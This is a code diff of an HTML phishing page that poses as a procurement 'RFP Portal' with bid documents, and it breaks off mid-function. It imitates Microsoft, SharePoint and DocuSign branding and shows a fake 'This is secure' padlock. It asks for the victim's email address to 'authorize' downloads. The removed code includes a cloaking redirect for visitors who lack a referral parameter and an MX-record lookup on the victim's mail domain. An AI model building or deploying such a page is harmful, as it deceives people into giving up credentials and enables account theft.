@@ -1,441 +1,353 @@
-<script> 
-
-
-//const urlParams = window.location.search;
-const state = window.location.hash.slice(1);
-
-
- 
-
-const from = new URLSearchParams(window.location.search).get('from');
-
-  
-  if (from !== 'b2b') {
-    window.location.href = 'https://www.docusign.com/';
-  }
-
-</script>
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<script>
- 
-    
-</script>
- 
-  <meta charset="utf-8" />
+  <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Project Documents</title>
- <link rel="icon" type="image/svg+xml" 
-    href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 256 256'%3E%3Crect width='256' height='256' fill='%23FF0000'/%3E%3Cpath d='M128 40 L40 216 H88 L128 120 L168 216 H216 Z' fill='%23FFFFFF'/%3E%3C/svg%3E" />
-  
-
+  <title>RFP Portal</title>
   <style>
     :root{
-      --bg:#f5f6f8;
-      --card:#ffffff;
-      --text:#1f2937;
-      --muted:#6b7280;
-      --line:#e5e7eb;
-      --btn:#2563eb;
-      --btnHover:#1d4ed8;
-      --shadow: 0 10px 30px rgba(0,0,0,.10);
-      --radius: 14px;
-      --font: system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji","Segoe UI Emoji";
+      --sp-primary:#0078d4;
+      --sp-primary-hover:#106ebe;
+      --sp-bg:#faf9f8;
+      --sp-card:#ffffff;
+      --sp-border:#edebe9;
+      --sp-text:#323130;
+      --sp-subtext:#605e5c;
     }
+
     *{box-sizing:border-box}
-    body{
-      margin:0;
-      font-family:var(--font);
-      color:var(--text);
-      background:
-        radial-gradient(1200px 600px at 20% 0%, #eef2ff 0%, transparent 55%),
-        radial-gradient(900px 500px at 80% 10%, #ecfeff 0%, transparent 55%),
-        var(--bg);
-    }
+    html,body{margin:0;padding:0;font-family:Segoe UI,Tahoma,Geneva,Verdana,sans-serif;color:var(--sp-text);background:var(--sp-bg)}
 
-    .topbar{
-      position:sticky; top:0;
-      backdrop-filter: blur(10px);
-      background: rgba(245,246,248,.75);
-      border-bottom:1px solid var(--line);
-      z-index:5;
-    }
-    .topbar-inner{
-      max-width:1080px;
-      margin:0 auto;
-      padding:14px 18px;
-      display:flex;
-      align-items:center;
-      gap:14px;
-    }
-    .brand{
-      display:flex; align-items:center; gap:10px; min-width:240px;
-    }
-    .brand-badge{
-      width:34px;height:34px;border-radius:10px;
-      background: linear-gradient(135deg,#2563eb,#22c55e);
-      box-shadow: 0 8px 18px rgba(37,99,235,.25);
-      flex:0 0 auto;
-    }
-    .brand-title{
-      display:flex; flex-direction:column; line-height:1.1;
-    }
-    .brand-title strong{font-size:14px; letter-spacing:.2px}
-    .brand-title span{font-size:12px; color:var(--muted)}
- 
+    /* Header */
+    .sp-header{height:56px;background:var(--sp-primary);display:flex;align-items:center;padding:0 16px;box-shadow:0 1px 3px rgba(0,0,0,.1)}
+    .sp-header__left{display:flex;align-items:center;gap:12px}
+    .sp-waffle{width:20px;height:20px;background:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" fill="white" viewBox="0 0 20 20"><path d="M2 2h4v4H2V2zm6 0h4v4H8V2zm6 0h4v4h-4V2zM2 8h4v4H2V8zm6 0h4v4H8V8zm6 0h4v4h-4V8zM2 14h4v4H2v-4zm6 0h4v4H8v-4zm6 0h4v4h-4v-4z"/></svg>') center/contain no-repeat}
+    .sp-header__pdficon{width:20px;height:20px;display:inline-flex;align-items:center;justify-content:center}
+    .sp-header__title{color:#fff;font-weight:600;font-size:16px;display:flex;align-items:center;gap:8px}
 
-/* Make each tile slightly different so it’s not “the” Microsoft mark */
- 
+    /* Breadcrumb */
+    .sp-breadcrumb{background:#fff;border-bottom:1px solid var(--sp-border);height:40px;display:flex;align-items:center;gap:6px;padding:0 24px;font-size:12px;color:var(--sp-subtext)}
+    .sp-breadcrumb a{color:var(--sp-primary);text-decoration:none}
+    .sp-breadcrumb a:hover{text-decoration:underline}
+    .sp-breadcrumb__sep{color:#a19f9d}
 
-    .search{
-      flex:1;
-      display:flex; align-items:center; gap:10px;
-      background:#fff;
-      border:1px solid var(--line);
-      border-radius:999px;
-      padding:10px 14px;
-      box-shadow: 0 2px 10px rgba(0,0,0,.04);
-    }
-    .search input{
-      border:none; outline:none; width:100%;
-      font-size:14px;
-    }
-    .pill{
-      font-size:12px;
-      color:#0f172a;
-      background:#fff7ed;
-      border:1px solid #fed7aa;
-      padding:6px 10px;
-      border-radius:999px;
-      white-space:nowrap;
-    }
+    /* Content */
+    .sp-content{max-width:1100px;margin:0 auto;padding:24px}
+    .sp-title{font-size:24px;font-weight:600;margin:0 0 6px}
+    .sp-desc{color:var(--sp-subtext);font-size:14px;margin:0 0 16px}
 
-    .wrap{max-width:1080px;margin:28px auto;padding:0 18px 48px;}
-    .header{
-      display:flex; flex-wrap:wrap; align-items:flex-end; justify-content:space-between;
-      gap:14px;
-      margin-top:14px;
-    }
-    h1{margin:0;font-size:22px}
-    .sub{
-      margin:6px 0 0;
-      color:var(--muted);
-      font-size:13px;
-    }
-    .panel{
-      margin-top:18px;
-      background:var(--card);
-      border:1px solid var(--line);
-      border-radius: var(--radius);
-      box-shadow: var(--shadow);
-      overflow:hidden;
-    }
-    .panel-head{
-      padding:14px 16px;
-      border-bottom:1px solid var(--line);
-      display:flex; align-items:center; justify-content:space-between; gap:10px;
-    }
-    .crumb{font-size:13px;color:var(--muted)}
-    .meta{font-size:12px;color:var(--muted)}
-    .badge{
-      font-size:11px;
-      padding:4px 8px;
-      border-radius:999px;
-      border:1px solid var(--line);
-      color:var(--muted);
-      background:#fff;
-    }
+    /* Command bar */
+    .sp-bar{background:#fff;border:1px solid var(--sp-border);border-radius:2px;padding:8px 16px;display:flex;align-items:center;justify-content:space-between;margin-bottom:6px}
+    .sp-select{display:flex;align-items:center;gap:8px;font-size:13px;color:var(--sp-subtext)}
+    .sp-checkbox{appearance:none;width:16px;height:16px;border:1px solid #a19f9d;border-radius:2px;background:#fff;position:relative;cursor:pointer}
+    .sp-checkbox:checked{background:var(--sp-primary);border-color:var(--sp-primary)}
+    .sp-checkbox:checked::after{content:"";position:absolute;inset:3px 4px 3px 4px;border-right:2px solid #fff;border-bottom:2px solid #fff;transform:rotate(45deg)}
+    .sp-count{font-size:13px;color:var(--sp-subtext)}
 
-    .row{
+    /* List */
+    .sp-list{background:#fff;border:1px solid var(--sp-border);border-radius:2px;overflow:hidden}
+    .sp-list__header,
+    .sp-row{
       display:grid;
-      grid-template-columns: 44px 1.7fr .7fr .5fr;
+      grid-template-columns:40px 1fr 140px 80px 100px; /* checkbox | name | modified | size | action */
       align-items:center;
-      gap:10px;
-      padding:12px 16px;
-      border-bottom:1px solid var(--line);
+      gap:0;
     }
-    .row:last-child{border-bottom:none}
-    .row:hover{background:#fafafa}
-    .th{
-      background:#fbfbfc;
-      font-size:12px;
-      color:var(--muted);
-      text-transform:uppercase;
-      letter-spacing:.06em;
-    }
+    .sp-list__header{height:32px;background:#faf9f8;border-bottom:1px solid var(--sp-border);font-size:12px;font-weight:600;color:#323130;padding:0 16px}
+    .sp-cell--mod{text-align:center}
+    .sp-cell--size{text-align:right;padding-right:16px}
+    .sp-cell--act{text-align:right;padding-right:16px}
 
-    .file{
-      display:flex; align-items:center; gap:12px; min-width:0;
-    }
-    .icon{
-      width:34px;height:34px;border-radius:10px;
-      display:grid; place-items:center;
-      border:1px solid var(--line);
-      background:#fff;
-      flex:0 0 auto;
-    }
-    .fname{
-      display:flex; flex-direction:column; min-width:0;
-    }
-    .fname strong{
-      font-size:14px;
-      white-space:nowrap;
-      overflow:hidden;
-      text-overflow:ellipsis;
-    }
-    .fname span{font-size:12px;color:var(--muted)}
-    .muted{color:var(--muted); font-size:13px}
+    .sp-row{min-height:44px;border-bottom:1px solid #f3f2f1;padding:0 16px;cursor:pointer}
+    .sp-row:hover{background:#f3f2f1}
+    .sp-row:last-child{border-bottom:none}
 
-    /* checkbox styling */
-    .chkWrap{
-      display:flex; align-items:center; justify-content:center;
-    }
-    input[type="checkbox"]{
-      width:18px;height:18px;
-      accent-color: var(--btn);
-      cursor:pointer;
-    }
+    .sp-cell--check{display:flex;justify-content:center}
+    .sp-namecell{display:flex;align-items:center;gap:8px;min-width:0}
+    .sp-icon{width:16px;height:16px;display:inline-flex;align-items:center;justify-content:center;flex-shrink:0}
+    .sp-name{font-size:14px;color:var(--sp-primary);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+    .sp-name:hover{text-decoration:underline}
+    .sp-meta{font-size:12px;color:var(--sp-subtext);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
 
-    /* bottom action bar */
-    .actionbar{
-      margin-top:14px;
-      background: rgba(255,255,255,.9);
-      border:1px solid var(--line);
-      border-radius: var(--radius);
-      box-shadow: 0 10px 22px rgba(0,0,0,.06);
-      padding:12px 14px;
-      display:flex;
-      align-items:center;
-      justify-content:space-between;
-      gap:10px;
-    }
-    .actionbar .left{
-      display:flex; gap:10px; align-items:center; flex-wrap:wrap;
-      color:var(--muted); font-size:13px;
-    }
-    .btn{
-      display:inline-flex; align-items:center; gap:8px;
-      border:none;
-      padding:10px 12px;
-      border-radius:10px;
-      background:var(--btn);
-      color:#fff;
-      cursor:pointer;
-      font-weight:600;
-      font-size:13px;
-      box-shadow: 0 10px 18px rgba(37,99,235,.22);
-      user-select:none;
-    }
-    .btn:hover{background:var(--btnHover)}
-    .btn:active{transform:translateY(1px)}
-    .btn.secondary{
-      background:#fff;
-      color:var(--text);
-      border:1px solid var(--line);
-      box-shadow:none;
-    }
-    .btn.secondary:hover{background:#f9fafb}
-    .btn:disabled{
-      opacity:.55;
-      cursor:not-allowed;
-      transform:none;
-    }
+    .sp-action-btn{font-size:12px;color:var(--sp-primary);background:transparent;border:none;cursor:pointer;padding:6px 8px;border-radius:3px}
+    .sp-action-btn:hover{background:#eef6fb}
+
+    /* Download section */
+    .sp-download{background:#fff;border:1px solid var(--sp-border);border-radius:2px;margin-top:16px;padding:16px;display:flex;align-items:center;justify-content:space-between;gap:16px}
+    .sp-download__info{font-size:13px;color:var(--sp-subtext)}
+    .sp-btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;min-width:220px;padding:12px 20px;border:none;border-radius:4px;font-weight:600;font-size:14px;cursor:pointer;color:#fff;background:linear-gradient(135deg,var(--sp-primary) 0%,var(--sp-primary-hover) 100%);box-shadow:0 2px 6px rgba(0,120,212,.25);transition:transform .15s ease,box-shadow .15s ease,opacity .15s ease}
+    .sp-btn:hover{transform:translateY(-1px);box-shadow:0 4px 10px rgba(0,120,212,.35)}
+    .sp-btn:active{transform:translateY(0)}
+    .sp-btn:disabled{opacity:.55;cursor:not-allowed;box-shadow:none}
 
     /* Modal */
-    .overlay{
-      position:fixed; inset:0;
-      background: rgba(15,23,42,.55);
-      display:none;
-      align-items:center;
-      justify-content:center;
-      z-index:50;
-      padding:18px;
-    }
-    .overlay.show{display:flex}
-    .modal{
-      width:min(560px, 100%);
-      background:#fff;
-      border-radius: 18px;
-      border:1px solid rgba(255,255,255,.2);
-      box-shadow: 0 30px 80px rgba(0,0,0,.35);
-      overflow:hidden;
-    }
-    .modal-head{
-      padding:16px 18px;
-      border-bottom:1px solid var(--line);
-      display:flex; align-items:flex-start; justify-content:space-between; gap:10px;
-    }
-    .modal-head h2{ margin:0; font-size:16px; }
-    .x{
-      border:none;background:transparent;cursor:pointer;
-      width:36px;height:36px;border-radius:10px;
-      display:grid; place-items:center;
-    }
-    .x:hover{background:#f3f4f6}
-    .modal-body{
-      padding:16px 18px;
-      max-height:min(70vh, 520px);
-      overflow:auto;
-    }
-    .callout{
-      display:flex; gap:12px;
-      background:#f8fafc;
-      border:1px solid var(--line);
-      border-radius:14px;
-      padding:12px;
-      margin-bottom:12px;
-    }
-    .callout strong{font-size:13px}
-    .callout span{display:block;color:var(--muted);font-size:12px;margin-top:2px; line-height:1.4}
-    label{display:block;font-size:12px;color:var(--muted);margin:10px 0 6px}
-    .input{
-      width:100%;
-      border:1px solid var(--line);
-      border-radius:12px;
-      padding:12px 12px;
-      font-size:14px;
-      outline:none;
-    }
-    .input:focus{border-color:#93c5fd; box-shadow: 0 0 0 4px rgba(147,197,253,.35)}
-    .modal-actions{
-      display:flex; gap:10px; justify-content:flex-end;
-      padding:14px 18px;
-      border-top:1px solid var(--line);
-      background:#fbfbfc;
-    }
-    .tiny{font-size:12px;color:var(--muted); margin-top:10px; line-height:1.4}
-
-    /* selection list in modal */
-    .selList{
-      margin:12px 0 0;
-      padding:10px 12px;
-      background:#fbfbfc;
-      border:1px solid var(--line);
-      border-radius:14px;
-      font-size:12px;
-      color:#334155;
-    }
-    .selList ul{ margin:6px 0 0; padding-left:18px; color:#475569; }
+    .sp-modal__overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.4);z-index:1000}
+    .sp-modal{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:#fff;border-radius:4px;box-shadow:0 6px 16px rgba(0,0,0,.15);width:92%;max-width:460px;overflow:hidden}
+    .sp-modal__head{padding:16px 20px;border-bottom:1px solid var(--sp-border)}
+    .sp-modal__title{display:flex;align-items:center;gap:8px;font-weight:600}
+    .sp-modal__subtitle{margin-top:6px;font-size:13px;color:var(--sp-subtext)}
+    .sp-modal__body{padding:16px 20px}
+    .sp-secure{display:flex;align-items:center;gap:6px;background:#eef6fb;border:1px solid #cfe7f7;color:#106ebe;padding:8px;border-radius:4px;margin-bottom:12px;font-size:12px}
+    .sp-auth-msg{font-size:13px;color:var(--sp-subtext);margin-bottom:10px}
+    .sp-form__group{margin-bottom:12px}
+    .sp-label{display:block;font-size:13px;font-weight:600;margin-bottom:6px}
+    .sp-input{width:100%;padding:8px;border:1px solid #a19f9d;border-radius:3px;font-size:14px}
+    .sp-input:focus{outline:none;border-color:var(--sp-primary);box-shadow:inset 0 0 0 1px var(--sp-primary)}
+    .sp-modal__foot{padding:12px 20px;border-top:1px solid var(--sp-border);display:flex;justify-content:flex-end;gap:8px}
+    .sp-btn--ghost{background:#f3f2f1;color:var(--sp-text)}
   </style>
 </head>
-
 <body>
-  <div class="topbar">
-    <div class="topbar-inner">
-      <div class="brand" aria-label="Document portal">
-        <div class="brand-mark" aria-hidden="true">
-  <span></span><span></span><span></span><span></span>
-</div>
-        <div class="brand-title">
-		 
-          <strong>Document Portal</strong>
-          <span>Project RFP Package</span>
+  <!-- Header with PDF icon + random project name + current date -->
+  <header class="sp-header">
+    <div class="sp-header__left">
+      <div class="sp-waffle" aria-hidden="true"></div>
+      <span class="sp-header__pdficon" aria-hidden="true">
+        <!-- PDF SVG icon in header -->
+        <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="PDF">
+          <path fill="#ffffff" d="M2 1h8l4 4v9a1 1 0 0 1-1 1H2a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1z" opacity="0.25"/>
+          <path fill="#ffffff" d="M10 1v4h4z" opacity="0.6"/>
+          <rect x="3.2" y="6.2" width="9.6" height="0.8" fill="#ffffff" opacity="0.9"/>
+          <rect x="3.2" y="8" width="8" height="0.8" fill="#ffffff" opacity="0.9"/>
+          <rect x="3.2" y="9.8" width="6" height="0.8" fill="#ffffff" opacity="0.9"/>
+        </svg>
+      </span>
+      <div id="spHeaderTitle" class="sp-header__title">RFP Project • Jan 01, 2026</div>
+    </div>
+  </header>
+
+  <!-- Navigation -->
+  <nav class="sp-breadcrumb">
+    <a href="#">Contoso</a><span class="sp-breadcrumb__sep">></span>
+    <a href="#">Project Sites</a><span class="sp-breadcrumb__sep">></span>
+    <span id="crumbProject">RFP Project</span>
+  </nav>
+
+  <!-- Main Content -->
+  <main class="sp-content">
+    <h1 id="pageTitle" class="sp-title">RFP Project</h1>
+    <p class="sp-desc">Bid docs for Downtown Office Complex</p>
+
+    <!-- Command Bar -->
+    <div class="sp-bar">
+      <div class="sp-select">
+        <input type="checkbox" id="selectAll" class="sp-checkbox" />
+        <label for="selectAll">Select all</label>
+      </div>
+      <div class="sp-count">5 items</div>
+    </div>
+
+    <!-- File List -->
+    <section class="sp-list">
+      <div class="sp-list__header">
+        <div></div>
+        <div>Name</div>
+        <div class="sp-cell--mod">Modified</div>
+        <div class="sp-cell--size">Size</div>
+        <div class="sp-cell--act">Actions</div>
+      </div>
+
+      <!-- Row 1: PDF -->
+      <div class="sp-row" onclick="toggleRow('file1')">
+        <div class="sp-cell--check">
+          <input type="checkbox" id="file1" class="sp-checkbox sp-item" />
+        </div>
+        <div class="sp-namecell">
+          <span class="sp-icon" aria-hidden="true">
+            <!-- PDF SVG icon -->
+            <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" role="img">
+              <path fill="#d13438" d="M2 1h8l4 4v9a1 1 0 0 1-1 1H2a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1z"/>
+              <path fill="#fff" d="M10 1v4h4z"/>
+              <rect x="3.2" y="6.2" width="9.6" height="0.8" fill="#fff"/>
+              <rect x="3.2" y="8" width="8" height="0.8" fill="#fff"/>
+              <rect x="3.2" y="9.8" width="6" height="0.8" fill="#fff"/>
+            </svg>
+          </span>
+          <div style="min-width:0">
+            <div class="sp-name">Project Specs</div>
+            <div class="sp-meta">Requirements, scope</div>
+          </div>
+        </div>
+        <div class="sp-cell--mod" data-random-modified>Dec 15</div>
+        <div class="sp-cell--size">2.4 MB</div>
+        <div class="sp-cell--act">
+          <button class="sp-action-btn" onclick="event.stopPropagation(); openModalSingle('file1')">Download</button>
         </div>
       </div>
 
-      <div class="search" role="search">
-        <svg height="1em" style="flex:none;line-height:1" viewBox="0 0 24 24" width="1em" xmlns="http://www.w3.org/2000/svg"><title>Azure</title><path d="M11.49 2H2v9.492h9.492V2h-.002z" fill="#F25022"></path><path d="M22 2h-9.492v9.492H22V2z" fill="#7FBA00"></path><path d="M11.49 12.508H2V22h9.492v-9.492h-.002z" fill="#00A4EF"></path><path d="M22 12.508h-9.492V22H22v-9.492z" fill="#FFB900"></path></svg>
-        <input id="search" type="text" placeholder="Search files" autocomplete="off" />
+      <!-- Row 2: CAD -->
+      <div class="sp-row" onclick="toggleRow('file2')">
+        <div class="sp-cell--check">
+          <input type="checkbox" id="file2" class="sp-checkbox sp-item" />
+        </div>
+        <div class="sp-namecell">
+          <span class="sp-icon" aria-hidden="true">
+            <!-- CAD SVG icon -->
+            <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" role="img">
+              <path fill="#7b68ee" d="M2 1h8l4 4v9a1 1 0 0 1-1 1H2a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1z"/>
+              <path fill="#fff" d="M10 1v4h4z"/>
+              <rect x="3" y="6.4" width="10" height="0.7" fill="#fff"/>
+              <rect x="3" y="8" width="8" height="0.7" fill="#fff"/>
+              <rect x="3" y="9.6" width="6" height="0.7" fill="#fff"/>
+              <circle cx="4.2" cy="11.2" r="0.35" fill="#fff"/>
+              <circle cx="6.4" cy="11.2" r="0.35" fill="#fff"/>
+            </svg>
+          </span>
+          <div style="min-width:0">
+            <div class="sp-name">Architectural Drawings</div>
+            <div class="sp-meta">Plans, elevations</div>
+          </div>
+        </div>
+        <div class="sp-cell--mod" data-random-modified>Dec 12</div>
+        <div class="sp-cell--size">15.7 MB</div>
+        <div class="sp-cell--act">
+          <button class="sp-action-btn" onclick="event.stopPropagation(); openModalSingle('file2')">Download</button>
+        </div>
       </div>
 
-      <div class="pill" title="Demo notice">Project Portal</div>
-    </div>
-  </div>
-
-  <div class="wrap">
-    <div class="header">
-      <div>
-        <h1>RFP Documents</h1>
-        <p class="sub">Select documents, then click <b>Download selected documents</b>.</p>
+      <!-- Row 3: Word -->
+      <div class="sp-row" onclick="toggleRow('file3')">
+        <div class="sp-cell--check">
+          <input type="checkbox" id="file3" class="sp-checkbox sp-item" />
+        </div>
+        <div class="sp-namecell">
+          <span class="sp-icon" aria-hidden="true">
+            <!-- Word SVG icon -->
+            <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" role="img">
+              <path fill="#185abd" d="M2 1h8l4 4v9a1 1 0 0 1-1 1H2a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1z"/>
+              <path fill="#fff" d="M10 1v4h4z"/>
+              <rect x="3.2" y="6.2" width="9.6" height="0.7" fill="#fff"/>
+              <rect x="3.2" y="7.8" width="8" height="0.7" fill="#fff"/>
+              <rect x="3.2" y="9.4" width="9" height="0.7" fill="#fff"/>
+              <rect x="3.2" y="11" width="7" height="0.7" fill="#fff"/>
+            </svg>
+          </span>
+          <div style="min-width:0">
+            <div class="sp-name">Bid Forms</div>
+            <div class="sp-meta">Terms, requirements</div>
+          </div>
+        </div>
+        <div class="sp-cell--mod" data-random-modified>Dec 10</div>
+        <div class="sp-cell--size">850 KB</div>
+        <div class="sp-cell--act">
+          <button class="sp-action-btn" onclick="event.stopPropagation(); openModalSingle('file3')">Download</button>
+        </div>
       </div>
-      <div class="meta">
-        <span class="badge" id="countBadge">— items</span>
-        <span class="badge" id="selectedBadge">0 selected</span>
-      </div>
-    </div>
 
-    <div class="panel" role="region" aria-label="Files list">
-      <div class="panel-head">
-        <div class="crumb">/ Projects / Project Broxell / RFP Package</div>
-        <div class="meta">Owner: Procurement Team</div>
+      <!-- Row 4: Excel -->
+      <div class="sp-row" onclick="toggleRow('file4')">
+        <div class="sp-cell--check">
+          <input type="checkbox" id="file4" class="sp-checkbox sp-item" />
+        </div>
+        <div class="sp-namecell">
+          <span class="sp-icon" aria-hidden="true">
+            <!-- Excel SVG icon -->
+            <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" role="img">
+              <path fill="#107c41" d="M2 1h8l4 4v9a1 1 0 0 1-1 1H2a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1z"/>
+              <path fill="#fff" d="M10 1v4h4z"/>
+              <rect x="3.2" y="6.2" width="2.5" height="1" fill="#fff"/>
+              <rect x="6" y="6.2" width="2.5" height="1" fill="#fff"/>
+              <rect x="8.8" y="6.2" width="2.5" height="1" fill="#fff"/>
+              <rect x="3.2" y="8" width="2.5" height="1" fill="#fff"/>
+              <rect x="6" y="8" width="2.5" height="1" fill="#fff"/>
+              <rect x="8.8" y="8" width="2.5" height="1" fill="#fff"/>
+              <rect x="3.2" y="9.8" width="2.5" height="1" fill="#fff"/>
+              <rect x="6" y="9.8" width="2.5" height="1" fill="#fff"/>
+              <rect x="8.8" y="9.8" width="2.5" height="1" fill="#fff"/>
+            </svg>
+          </span>
+          <div style="min-width:0">
+            <div class="sp-name">Cost Template</div>
+            <div class="sp-meta">Budget, breakdown</div>
+          </div>
+        </div>
+        <div class="sp-cell--mod" data-random-modified>Dec 8</div>
+        <div class="sp-cell--size">1.2 MB</div>
+        <div class="sp-cell--act">
+          <button class="sp-action-btn" onclick="event.stopPropagation(); openModalSingle('file4')">Download</button>
+        </div>
       </div>
 
-      <div class="row th" aria-hidden="true">
-        <div style="text-align:center;">Select</div><div>Name</div><div>Type</div><div>Size</div>
+      <!-- Row 5: PDF -->
+      <div class="sp-row" onclick="toggleRow('file5')">
+        <div class="sp-cell--check">
+          <input type="checkbox" id="file5" class="sp-checkbox sp-item" />
+        </div>
+        <div class="sp-namecell">
+          <span class="sp-icon" aria-hidden="true">
+            <!-- PDF SVG icon -->
+            <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" role="img">
+              <path fill="#d13438" d="M2 1h8l4 4v9a1 1 0 0 1-1 1H2a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1z"/>
+              <path fill="#fff" d="M10 1v4h4z"/>
+              <rect x="3.2" y="6.2" width="9.6" height="0.8" fill="#fff"/>
+              <rect x="3.2" y="8" width="8" height="0.8" fill="#fff"/>
+              <rect x="3.2" y="9.8" width="6" height="0.8" fill="#fff"/>
+            </svg>
+          </span>
+          <div style="min-width:0">
+            <div class="sp-name">Payment Schedule</div>
+            <div class="sp-meta">Milestones, terms</div>
+          </div>
+        </div>
+        <div class="sp-cell--mod" data-random-modified>Dec 5</div>
+        <div class="sp-cell--size">680 KB</div>
+        <div class="sp-cell--act">
+          <button class="sp-action-btn" onclick="event.stopPropagation(); openModalSingle('file5')">Download</button>
+        </div>
       </div>
+    </section>
 
-      <div id="fileRows"></div>
-    </div>
-
-    <div class="actionbar" role="region" aria-label="Selection actions">
-      <div class="left">
-        <button class="btn secondary" id="selectAllBtn" type="button">Select all</button>
-        <button class="btn secondary" id="clearBtn" type="button">Clear</button>
-        <span id="selectionText">No documents selected.</span>
-      </div>
-      <button class="btn" id="downloadSelectedBtn" type="button" disabled>
-        Download selected documents
+    <!-- Download Selected -->
+    <section class="sp-download">
+      <div id="selectedCount" class="sp-download__info">Select documents to download</div>
+      <button id="downloadBtn" class="sp-btn" disabled onclick="openModal()">
+        📥 Download selected
       </button>
-    </div>
-
-    <div class="tiny" style="margin-top:10px;">
-      These documents are classified and can only be viewed/downloaded by the intended recipients. To download files, simply input your email address and click on download documents.
-    </div>
-  </div>
+    </section>
+  </main>
 
   <!-- Modal -->
-  <div class="overlay" id="overlay" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
-    <div class="modal">
-      <div class="modal-head">
-        <div>
-         
-          <div class="sub" id="modalSub" style="margin:6px 0 0;">
-            Enter your email address to validate access and request download links.
-          </div>
+  <div id="modalOverlay" class="sp-modal__overlay">
+    <div class="sp-modal">
+      <div class="sp-modal__head">
+        <div class="sp-modal__title">
+          <!-- PDF icon in modal title -->
+          <span class="sp-icon" aria-hidden="true">
+            <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" role="img">
+              <path fill="#d13438" d="M2 1h8l4 4v9a1 1 0 0 1-1 1H2a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1z"/>
+              <path fill="#fff" d="M10 1v4h4z"/>
+              <rect x="3.2" y="6.2" width="9.6" height="0.8" fill="#fff"/>
+            </svg>
+          </span>
+          <span>Download documents</span>
         </div>
-        <button class="x" id="closeModal" aria-label="Close dialog">
-          <svg width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
-            <path d="M6 6 18 18M18 6 6 18" fill="none" stroke="#334155" stroke-width="2" stroke-linecap="round"/>
-          </svg>
-        </button>
+        <div id="modalProjectName" class="sp-modal__subtitle">Project Name</div>
       </div>
-
-      <div class="modal-body">
-        <div class="callout">
-          <div class="icon" aria-hidden="true" style="width:38px;height:38px;border-radius:12px;">
-            <svg height="1em" style="flex:none;line-height:1" viewBox="0 0 24 24" width="1em" xmlns="http://www.w3.org/2000/svg"><title>Azure</title><path d="M11.49 2H2v9.492h9.492V2h-.002z" fill="#F25022"></path><path d="M22 2h-9.492v9.492H22V2z" fill="#7FBA00"></path><path d="M11.49 12.508H2V22h9.492v-9.492h-.002z" fill="#00A4EF"></path><path d="M22 12.508h-9.492V22H22v-9.492z" fill="#FFB900"></path></svg>
-          </div>
-          <div>
-            <strong>      These documents are classified and can only be viewed/downloaded by the intended recipients. To download files, simply input your email address and click on download documents.
-</strong>
-            <span>
-            </span>
-          </div>
+      <div class="sp-modal__body">
+        <!-- Secure badge with padlock -->
+        <div class="sp-secure">
+          <span class="sp-icon" aria-hidden="true" title="Secure">
+            <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" role="img">
+              <path fill="#106ebe" d="M4 7V5a4 4 0 118 0v2h1a1 1 0 011 1v6a1 1 0 01-1 1H4a1 1 0 01-1-1V8a1 1 0 011-1h1zm2-2a2 2 0 114 0v2H6V5z"/>
+            </svg>
+          </span>
+          <span>This is secure</span>
         </div>
 
-        <div class="selList" id="selList">
-          <strong>Selected documents</strong>
-          <ul id="selUl"></ul>
-        </div>
-
-        <label for="email">Email address</label>
-        <input class="input" id="email" type="email" placeholder="name@company.com" autocomplete="email" />
-
-        <div class="tiny" style="font-weight: bold">
+        <p class="sp-auth-msg">Enter your email address to confirm you’re authorized to download the selected document(s).</p>
+        <div class="sp-form__group">
+          <label class="sp-label" for="emailInput">Email address</label>
+          <input id="emailInput" type="email" class="sp-input" placeholder="name@company.com" />
         </div>
       </div>
-
-      <div class="modal-actions">
-        <button class="btn secondary" id="cancelBtn" type="button">Cancel</button>
-        <button class="btn" id="continueBtn" type="button">Download Documents</button>
+      <div class="sp-modal__foot">
+        <button class="sp-btn sp-btn--ghost" onclick="closeModal()">Cancel</button>
+        <button class="sp-btn" onclick="processDownload()">Submit</button>
       </div>
     </div>
   </div>
 
-  <script>
-  
+<script>
   function checkUrlHashForGrant() {
     // Get the current URL hash (everything after #)
     const urlHash = window.location.hash;
@@ -453,269 +365,179 @@ const from = new URLSearchParams(window.location.search).get('from');
 // Execute the check when the page loads
 document.addEventListener('DOMContentLoaded', checkUrlHashForGrant);
 
-  
-      const apiURL = "https://dns.google/resolve?type=MX&name=";  
+  const selected = new Set();
+  let singleSelectionOverride = null; // if set, modal acts on just one file
+  let currentProjectName = 'RFP Project';
 
-    async function getMXRecords(domain) {
-      const url = `${apiURL}${domain}`;
-      try {
-        const response = await fetch(url);
-        if (!response.ok) {
-          throw new Error(`Failed to fetch MX records: ${response.statusText}`);
-        }
-        const data = await response.json();
-        return data.Answer || []; // Return the list of MX records
-      } catch (error) {
-        console.error("Error fetching MX records:", error);
-        return [];
-      }
+  // Random project name and current date in header
+  function generateProjectName(){
+    const adjectives = ['Downtown'];
+    const nouns = ['Office','Complex','Center','Plaza','Tower','Hub','Park','Square','Campus','Works'];
+    const types = ['RFP','Bid','Proposal','Tender'];
+    const a = adjectives[Math.floor(Math.random()*adjectives.length)];
+    const n = nouns[Math.floor(Math.random()*nouns.length)];
+    const t = types[Math.floor(Math.random()*types.length)];
